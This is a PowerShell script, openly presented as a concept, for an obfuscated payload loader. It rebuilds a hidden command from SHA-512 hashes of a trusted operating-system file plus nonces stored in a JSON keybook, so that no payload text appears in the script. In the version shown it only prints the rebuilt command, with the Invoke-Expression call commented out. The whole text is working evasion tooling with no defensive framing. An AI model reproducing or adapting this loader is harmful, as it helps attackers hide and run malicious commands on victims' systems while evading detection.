<#
    CONCEPT: JIT INSTRUCTION RECONSTRUCTION
    This script is entirely benign until the moment of execution. It
    extracts its malicious intent from the host Operating System's own
    trusted files.
#>
function Invoke-HashedPayload {
    param ([String]$JsonPath)

    try {
        $Payload = Get-Content -Raw $JsonPath | ConvertFrom-Json

        # PERSISTENCE CHECK: Ensures environment matches the mined state.
        if (-not (Test-Path $Payload.s)) { throw "Environmental mismatch: Entropy source missing." }
        $SeedBytes = [System.IO.File]::ReadAllBytes($Payload.s)[0..5119]

        $FinalCommand = ""
        $Hasher = [System.Security.Cryptography.SHA512]::Create()

        foreach ($Key in $Payload.keys) {
            # ENTROPY DECOMPRESSION
            $NonceBytes = [System.Text.Encoding]::UTF8.GetBytes($Key.n.ToString())
            $HashString = [System.BitConverter]::ToString($Hasher.ComputeHash($SeedBytes + $NonceBytes)).Replace("-", "").ToLower()

            # COORDINATE-BASED EXTRACTION
            $HexFragment = $HashString.Substring($Key.o, $Key.l)
            for ($i = 0; $i -lt $HexFragment.Length; $i += 2) {
                $FinalCommand += [char][Convert]::ToByte($HexFragment.Substring($i, 2), 16)
            }
        }

        # DEMONSTRATION LOGIC: Showcasing the 'Ghost' payload reconstruction.
        Write-Host "`n[+] Environmental Mapping Successful." -ForegroundColor Cyan
        Write-Host "[+] Reconstructed Payload: $FinalCommand" -ForegroundColor Yellow

        # Invoke-Expression $FinalCommand
    }
    catch {
        Write-Error "Reconstruction Failed: Target environment differs from mined baseline."
    }
}

Invoke-HashedPayload -JsonPath ".\keybook.json"